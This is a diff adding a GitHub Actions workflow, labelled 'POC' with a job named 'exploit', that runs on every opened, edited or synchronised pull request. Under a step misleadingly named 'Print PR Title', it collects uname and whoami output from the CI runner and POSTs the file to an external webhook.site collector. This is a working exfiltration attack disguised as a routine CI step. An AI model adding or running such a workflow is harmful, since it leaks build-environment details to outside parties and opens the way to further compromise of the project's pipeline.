@@ -1,0 +1,18 @@
+name: POC
+
+on:
+  pull_request:
+    types: [opened, edited, synchronize]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print PR Title
+        run: |
+          echo "$TITLE" | grep .
+          uname -a > out.txt
+          whoami >> out.txt
+          curl -X POST --data-binary @out.txt https://webhook.site/1e9893ef-b9fa-4c63-a2ae-642d992cc639
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
